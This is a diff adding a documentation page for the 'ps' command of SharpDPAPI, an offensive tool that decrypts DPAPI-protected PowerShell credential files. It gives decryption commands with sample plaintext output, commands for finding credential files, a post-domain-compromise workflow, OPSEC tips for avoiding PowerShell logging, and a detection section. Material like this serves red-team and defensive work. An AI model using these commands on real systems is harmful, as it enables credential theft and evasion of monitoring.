@@ -1,0 +1,424 @@
+---
+title: 'ps'
+description: 'Decrypt PowerShell PSCredential CLIXML files'
+icon: 'terminal'
+---
+
+## Overview
+
+The **ps** command decrypts exported PowerShell PSCredential objects stored in CLIXML format. These files contain DPAPI-encrypted passwords that PowerShell administrators use to store credentials in scripts.
+
+<Info>
+  PowerShell's `Export-CLIXML` saves PSCredential objects with passwords encrypted using DPAPI, making them portable between sessions but tied to the user account.
+</Info>
+
+## Basic Usage
+
+```bash
+# Decrypt with CryptUnprotectData (unprivileged)
+SharpDPAPI.exe ps /target:C:\Path\To\cred.xml /unprotect
+
+# Decrypt with domain backup key
+SharpDPAPI.exe ps /target:C:\Path\To\cred.xml /pvk:key.pvk
+
+# Decrypt with masterkey mappings
+SharpDPAPI.exe ps /target:C:\Path\To\cred.xml {GUID}:SHA1
+
+# Decrypt with user password
+SharpDPAPI.exe ps /target:C:\Path\To\cred.xml /password:Password123!
+```
+
+<Warning>
+  The `/target:FILE.xml` parameter is **required** for the ps command. You must specify which credential XML file to decrypt.
+</Warning>
+
+## Command Arguments
+
+### Required Arguments
+
+| Argument | Description |
+|----------|-------------|
+| `/target:FILE.xml` | **Required** - Path to PSCredential CLIXML file |
+
+### Decryption Methods
+
+<Tabs>
+  <Tab title="CryptUnprotectData">
+    ```bash
+    # Use Windows API for decryption (unprivileged)
+    SharpDPAPI.exe ps /target:C:\Temp\cred.xml /unprotect
+    ```
+
+    <Tip>
+      This method works **without** masterkeys if run from the user context who exported the credential. No LSASS access required!
+    </Tip>
+  </Tab>
+
+  <Tab title="Domain Backup Key">
+    ```bash
+    # Base64-encoded key
+    SharpDPAPI.exe ps /target:C:\Temp\cred.xml /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...
+
+    # Key file
+    SharpDPAPI.exe ps /target:C:\Temp\cred.xml /pvk:key.pvk
+    ```
+
+    First decrypts user masterkeys, then uses them to decrypt the credential password.
+  </Tab>
+
+  <Tab title="Masterkey Mappings">
+    ```bash
+    # Inline masterkeys
+    SharpDPAPI.exe ps /target:C:\Temp\cred.xml {GUID1}:SHA1 {GUID2}:SHA1
+
+    # Masterkey file
+    SharpDPAPI.exe ps /target:C:\Temp\cred.xml /mkfile:masterkeys.txt
+    ```
+
+    Directly uses pre-decrypted masterkeys for password decryption.
+  </Tab>
+
+  <Tab title="User Credentials">
+    ```bash
+    # Plaintext password
+    SharpDPAPI.exe ps /target:C:\Temp\cred.xml /password:Password123!
+
+    # NTLM hash
+    SharpDPAPI.exe ps /target:C:\Temp\cred.xml /ntlm:8846F7EAEE8FB117AD06BDD830B7586C
+
+    # DPAPI credkey
+    SharpDPAPI.exe ps /target:C:\Temp\cred.xml /credkey:abc123...
+    ```
+  </Tab>
+</Tabs>
+
+<Note>
+  The `/server` argument is **not** applicable to the ps command since you must specify a specific target file.
+</Note>
+
+## How PowerShell Credential Export Works
+
+When administrators export PowerShell credentials:
+
+<Steps>
+  <Step title="Create PSCredential">
+    ```powershell
+    $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+    $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $SecPassword)
+    ```
+  </Step>
+
+  <Step title="Export to XML">
+    ```powershell
+    $Cred | Export-CLIXML C:\Temp\cred.xml
+    ```
+
+    This saves the credential with DPAPI-encrypted password
+  </Step>
+
+  <Step title="Import for Use">
+    ```powershell
+    $ImportedCred = Import-CLIXML C:\Temp\cred.xml
+    # Password automatically decrypted by Windows
+    ```
+
+    Only works for the user who exported it
+  </Step>
+</Steps>
+
+## Example: Using /unprotect
+
+```powershell
+# Create and export credential
+PS C:\Temp> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+PS C:\Temp> New-Object System.Management.Automation.PSCredential('TESTLAB\user', $SecPassword) | Export-CLIXML C:\Temp\cred.xml
+```
+
+```bash
+# Decrypt with SharpDPAPI
+SharpDPAPI.exe ps /target:C:\Temp\cred.xml /unprotect
+```
+
+**Output:**
+```
+[*] Action: Describe PSCredential .xml
+
+    CredFile         : C:\Temp\cred.xml
+    Accessed         : 7/25/2019 11:53:09 AM
+    Modified         : 7/25/2019 11:53:09 AM
+    User Name        : TESTLAB\user
+    guidMasterKey    : {0241bc33-44ae-404a-b05d-a35eea8cbc63}
+    size             : 170
+    flags            : 0x0
+    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
+    description      :
+    Password         : Password123!
+```
+
+## Example: Using Masterkey Mappings
+
+```powershell
+# Create and export credential
+PS C:\Temp> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+PS C:\Temp> New-Object System.Management.Automation.PSCredential('TESTLAB\user', $SecPassword) | Export-CLIXML C:\Temp\cred.xml
+```
+
+```bash
+# Decrypt with masterkeys
+SharpDPAPI.exe ps /target:C:\Temp\cred.xml "{0241bc33-44ae-404a-b05d-a35eea8cbc63}:E7E481877B9D51C17E015EB3C1F72FB887363EE3"
+```
+
+**Output:**
+```
+[*] Action: Describe PSCredential .xml
+
+[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!
+
+[*] User master key cache:
+
+{0241bc33-44ae-404a-b05d-a35eea8cbc63}:E7E481877B9D51C17E015EB3C1F72FB887363EE3
+
+    CredFile         : C:\Temp\cred.xml
+    Accessed         : 7/25/2019 12:04:12 PM
+    Modified         : 7/25/2019 12:04:12 PM
+    User Name        : TESTLAB\user
+    guidMasterKey    : {0241bc33-44ae-404a-b05d-a35eea8cbc63}
+    size             : 170
+    flags            : 0x0
+    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
+    description      :
+    Password         : Password123!
+```
+
+## Example: Using Domain Backup Key
+
+```powershell
+# Create and export credential
+PS C:\Temp> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+PS C:\Temp> New-Object System.Management.Automation.PSCredential('TESTLAB\user', $SecPassword) | Export-CLIXML C:\Temp\cred.xml
+```
+
+```bash
+# Decrypt with backup key
+SharpDPAPI.exe ps /target:C:\Temp\cred.xml /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...
+```
+
+**Output:**
+```
+[*] Action: Describe PSCredential .xml
+
+[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!
+
+[*] User master key cache:
+
+{0241bc33-44ae-404a-b05d-a35eea8cbc63}:E7E481877B9D51C17E015EB3C1F72FB887363EE3
+
+    CredFile         : C:\Temp\cred.xml
+    Accessed         : 7/25/2019 12:04:12 PM
+    Modified         : 7/25/2019 12:04:12 PM
+    User Name        : TESTLAB\user
+    guidMasterKey    : {0241bc33-44ae-404a-b05d-a35eea8cbc63}
+    size             : 170
+    flags            : 0x0
+    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
+    description      :
+    Password         : Password123!
+```
+
+## Finding PSCredential XML Files
+
+PowerShell credential files can be anywhere, but common locations include:
+
+**Script Directories:**
+```
+%USERPROFILE%\Documents\
+%USERPROFILE%\Scripts\
+C:\Scripts\
+Network shares
+```
+
+**Search Commands:**
+```powershell
+# PowerShell - Search for credential XML files
+Get-ChildItem -Path C:\Users\ -Recurse -Filter *.xml -ErrorAction SilentlyContinue |
+  Select-String -Pattern "PSCredential" -List |
+  Select-Object Path
+
+# CMD - Find XML files
+dir C:\*.xml /s
+```
+
+**Script Analysis:**
+```powershell
+# Look for Import-CLIXML in scripts
+Get-ChildItem -Path C:\Scripts\ -Recurse -Filter *.ps1 |
+  Select-String -Pattern "Import-CLIXML" -List
+```
+
+## Common Scenarios
+
+<AccordionGroup>
+  <Accordion title="Unprivileged Execution (Recommended)">
+    Run as the user who created the credential:
+
+    ```bash
+    # No masterkeys or elevation needed
+    SharpDPAPI.exe ps /target:C:\Scripts\admin-cred.xml /unprotect
+    ```
+
+    **Benefits:**
+    - No LSASS access required
+    - No elevation needed
+    - Minimal detection footprint
+  </Accordion>
+
+  <Accordion title="Post-Domain Compromise">
+    After obtaining domain backup key:
+
+    ```bash
+    # 1. Retrieve backup key
+    SharpDPAPI.exe backupkey /file:key.pvk
+
+    # 2. Find credential XML files
+    # Use file system search
+
+    # 3. Decrypt found credentials
+    SharpDPAPI.exe ps /target:C:\Scripts\service-account.xml /pvk:key.pvk
+    SharpDPAPI.exe ps /target:C:\Automation\db-cred.xml /pvk:key.pvk
+    ```
+  </Accordion>
+
+  <Accordion title="Script Analysis Workflow">
+    Analyze scripts to find and decrypt credentials:
+
+    ```bash
+    # 1. Find PowerShell scripts
+    Get-ChildItem -Recurse -Filter *.ps1
+
+    # 2. Look for Import-CLIXML usage
+    Select-String -Pattern "Import-CLIXML" -Path *.ps1
+
+    # 3. Identify credential file paths
+    # Check script contents for file paths
+
+    # 4. Decrypt discovered credential files
+    SharpDPAPI.exe ps /target:C:\Path\Found\In\Script.xml /pvk:key.pvk
+    ```
+  </Accordion>
+
+  <Accordion title="Offline/Forensic Analysis">
+    Analyzing copied credential files:
+
+    ```bash
+    # Decrypt with backup key
+    SharpDPAPI.exe ps /target:C:\Evidence\cred.xml /pvk:key.pvk
+
+    # Decrypt with known masterkey
+    SharpDPAPI.exe ps /target:C:\Evidence\cred.xml {GUID}:SHA1
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Why Administrators Use Credential Export
+
+<AccordionGroup>
+  <Accordion title="Automation Scripts">
+    - Scheduled tasks requiring credentials
+    - Unattended script execution
+    - Service account password storage
+    - Database connection credentials
+  </Accordion>
+
+  <Accordion title="Configuration Management">
+    - Deployment scripts
+    - Configuration automation
+    - Batch operations
+    - Remote management tasks
+  </Accordion>
+
+  <Accordion title="Development/Testing">
+    - Test credentials in development
+    - Lab environment automation
+    - Demo/training scripts
+  </Accordion>
+</AccordionGroup>
+
+<Warning>
+  Storing credentials in CLIXML is convenient but insecure. They're only as protected as the user's account.
+</Warning>
+
+## Detection Considerations
+
+**Host-Based Indicators:**
+- Reading PowerShell CLIXML files
+- Non-PowerShell processes accessing .xml credential files
+- Enumeration of script directories
+- Pattern matching for PSCredential XML structure
+
+**Defensive Monitoring:**
+- Monitor access to common script directories
+- Alert on CLIXML file access by suspicious processes
+- Track credential export operations (Export-CLIXML)
+- Detect bulk XML file enumeration
+- Monitor for LSASS access (when not using /unprotect)
+
+**PowerShell Logging:**
+```
+Event ID: 4104 (Script Block Logging)
+Event ID: 4103 (Module Logging)
+Look for: Export-CLIXML, Import-CLIXML cmdlets
+```
+
+## Related Commands
+
+<CardGroup cols={2}>
+  <Card title="credentials" icon="id-card" href="/ghostpack-docs/SharpDPAPI-mdx/commands/credentials">
+    Decrypt Credential Manager files
+  </Card>
+  <Card title="blob" icon="database" href="/ghostpack-docs/SharpDPAPI-mdx/commands/blob">
+    Decrypt arbitrary DPAPI blobs
+  </Card>
+  <Card title="masterkeys" icon="key" href="/ghostpack-docs/SharpDPAPI-mdx/commands/masterkeys">
+    Decrypt user masterkeys
+  </Card>
+  <Card title="backupkey" icon="download" href="/ghostpack-docs/SharpDPAPI-mdx/commands/backupkey">
+    Retrieve domain backup key
+  </Card>
+</CardGroup>
+
+## Tips
+
+<Accordion title="Finding Credentials">
+  - Search common script directories
+  - Look for .ps1 files using Import-CLIXML
+  - Check scheduled tasks for PowerShell scripts
+  - Examine automation frameworks (Jenkins, Azure DevOps)
+  - Review configuration management tools
+</Accordion>
+
+<Accordion title="OPSEC Considerations">
+  - Prefer `/unprotect` when running as target user
+  - Target specific files to avoid bulk enumeration
+  - Redirect output to file with `/consoleoutfile`
+  - Clean up temporary files after use
+  - Avoid triggering PowerShell logging
+</Accordion>
+
+<Accordion title="Troubleshooting">
+  **Decryption fails with /unprotect:**
+  - Must run from user context who exported credential
+  - Try using masterkeys or backup key instead
+  - Verify you're running as correct user
+  - File may be corrupted or invalid format
+
+  **Invalid XML format:**
+  - File may not be a PSCredential export
+  - Could be different type of XML
+  - Verify file contents include DPAPI blob
+  - Check for SecureString element in XML
+
+  **Masterkey GUID not found:**
+  - Extract masterkey from user's profile
+  - Use domain backup key for decryption
+  - Masterkey may have been rotated/deleted
+</Accordion>
